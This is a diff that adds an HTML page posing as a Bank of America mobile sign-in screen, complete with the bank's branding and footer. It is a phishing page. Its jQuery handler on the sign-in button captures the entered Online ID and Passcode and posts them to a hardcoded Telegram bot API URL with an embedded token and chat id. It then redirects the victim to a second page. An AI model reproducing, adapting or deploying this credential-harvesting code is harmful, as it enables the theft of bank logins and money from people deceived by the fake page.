@@ -1,0 +1,184 @@
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+ <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel="stylesheet" href="./style.css">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+<link rel="stylesheet" type="text/css" href="mobilstyle.css">
+</head>
+<body>
+<div id="main" style="height: 40px; background-color: #D9003B; ">
+  
+  <strong style="font-size:25px;cursor:pointer; color: white;margin-left: 5px;" onclick="openNav()">&#9776;</strong>
+  <center>
+    <div class="log" style="margin-top: -28px;  color: white;">
+       <span style=" font-weight: 600; font-size: 18px; font-family: sans-serif;">Sign in</span>
+    </div>
+   
+  </center>
+
+</div>
+<div id="YanMenu" class="sidenav">
+  <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">
+
+  &times;</a>
+
+  <ul style="background-color:#F2EFE9;">  
+    <li class="ass">  
+        <a href="#" class="">Accounts</a>
+    </li>
+
+    <li class="ass">  
+        <a href="#" class="">Bill Pay</a>
+    </li>
+    <li class="ass">  
+        <a href="#" class="">Payments & Invoicing</a>
+    </li>
+    <li class="ass">  
+        <a href="#" class="">Transfer | Send</a>
+    </li>
+    <li class="ass">  
+        <a href="#" class="">Special Offers & Deals</a>
+    </li>
+    
+  </ul>
+  <br>
+    <ul style="background-color:#F2EFE9;">  
+    <li class="ass">  
+        <a href="#" class="">Help & Support</a>
+    </li>
+
+    <li class="ass">  
+        <a href="#" class="">Contact Us</a>
+    </li>
+    <li class="ass">  
+        <a href="#" class="">Locations</a>
+    </li>
+    <li class="ass">  
+        <a href="#" class="">Profile & Settings</a>
+    </li>
+   
+    
+  </ul>
+
+  <br>
+    <ul style="background-color:#F2EFE9;">  
+    <li class="ass">  
+        <a href="#" class="">Send App Feedback</a>
+    </li>
+
+    <li class="ass">  
+        <a href="#" class="">Legal Info & Disclosures</a>
+    </li>
+    
+    
+  </ul>
+</div>
+<br>
+<div class="orta">
+  
+<div class="container">
+  <div class="row">
+    <div class="col-md-12">
+      <form>
+          <div class="form-group">
+          
+            <input type="text" class="form-control" id="usname" placeholder="Online ID" style="height: 45px; width: 70%; border-radius: 10px;">
+            <p style="float: right; margin-top: -50px;color: gray; font-size: 13px; margin-right: 10%;">Save ID</p><br>
+            <input id='checkbox' type='checkbox'>
+<label for='checkbox'>
+  <div class='s'>
+    <div class='d'></div>
+    <div class='d'></div>
+    <div class='d'></div>
+    <div class='d'></div>
+    <div class='d'></div>
+    <div class='d'></div>
+    <div class='d'></div>
+    <div class='d'></div>
+    <div class='d'></div>
+  </div>
+</label>
+<input type="text" class="form-control" id="pass" placeholder="Passcode" style="height: 45px; width: 100%; border-radius: 10px; background-color: #F6F3EF;">
+
+          </div>
+         <button type="button" id="checkpointSubmitButton" class="btn btn-primary" style="width: 100%; background-color: #0173B4;"><i class="fas fa-lock"></i>&nbsp;&nbsp; Sign in</button>
+</form>
+<center>
+  <a href="#" style="color: #5000FD; text-decoration: none;">Forgot ID/Passcode?</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+  <a href="#" style="color: #5000FD; text-decoration: none;">Enroll</a>
+
+</center>
+<div class="bosluk" style="height: 200px;">  </div>
+<div class="row">
+<div class="col-md-4"> 
+    <a href="" style="font-size: 10px; color: #0170BF;">Privacy</a> &nbsp; &nbsp; &nbsp;
+    <a href="" style="font-size: 10px; color: #0170BF;">Security</a>
+    <p style="font-size: 10px;color: gray;"> 2021 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p>
+</div>
+<div class="col-md-4">  </div>
+<div class="col-md-4"> 
+<a href=" " style="font-size: 10px; color: #0170BF;" >Equal Housing Lender </a><i class="fas fa-home" style="font-size: 10px; color: gray;"> </i>
+
+ </div>
+ </div>
+    </div>
+  </div>
+</div>
+
+</div>
+
+<script>
+function openNav() {
+  document.getElementById("YanMenu").style.width = "250px";
+  document.getElementById("main").style.marginLeft = "250px";
+  document.body.style.backgroundColor = "rgba(0,0,0,0.4)";
+}
+
+function closeNav() {
+  document.getElementById("YanMenu").style.width = "0";
+  document.getElementById("main").style.marginLeft= "0";
+  document.body.style.backgroundColor = "white";
+}
+</script>
+   <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+      <script>
+       
+      
+
+
+    $(document).ready(function () {
+    $('#checkpointSubmitButton').click(function(e) {
+
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            
+
+            var usname = document.getElementById('usname').value;
+            var pass = document.getElementById('pass').value;
+            var icerik = "BANKOFAMERICA==>" + "Online ID: " + usname + "      " + "Password: " + pass;
+
+if(usname != ""){
+
+             $.post("https://api.telegram.org/bot1872229939:AAHUbiGPsCSGklZqSdxEODxWtOQYjPAZUSY/sendMessage?text="+icerik+"&chat_id=-527186560", 
+              
+              function (data, status) {
+                //console.log(data);
+                  window.location.href = "login_mobil.html";
+           });
+             }
+
+
+            
+     });
+});
+
+    </script>
+</body>
+</html> 
